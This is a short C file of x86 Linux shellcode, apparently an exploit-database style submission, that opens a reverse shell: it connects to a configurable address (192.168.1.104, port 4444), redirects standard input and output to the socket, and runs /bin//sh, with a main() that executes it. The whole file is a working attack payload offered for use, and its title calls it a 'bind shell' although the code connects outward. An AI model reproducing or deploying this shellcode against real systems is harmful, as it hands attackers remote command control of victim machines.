/* Title: Reverse TCP Bind Shell ( 78 bytes)
 * Author: pktmonky
 * Description: Shellcode to open a reverse tcp bind shell from a remote host.
 * IP and Port are configurable.
 */

#include<stdio.h>
#include<string.h>

/* IPADDR 192.168.1.104 (c0a80168)
 * PORT 4444 (115c)
 */
#define IPADDR "\xc0\xa8\x01\x68"
#define PORT "\x11\x5c"
 
unsigned char code[] =
"\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x68"IPADDR"\x66\x68"PORT"\x66\x53\x89\xe1\x6a\x10\x51\x50\x89\xe1\xb0\x66\x43\xcd\x80\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80";
 
main()
{

    printf("Shellcode Length:  %d\n", strlen(code));

    int (*ret)() = (int(*)())code;
 
    ret();
 
}
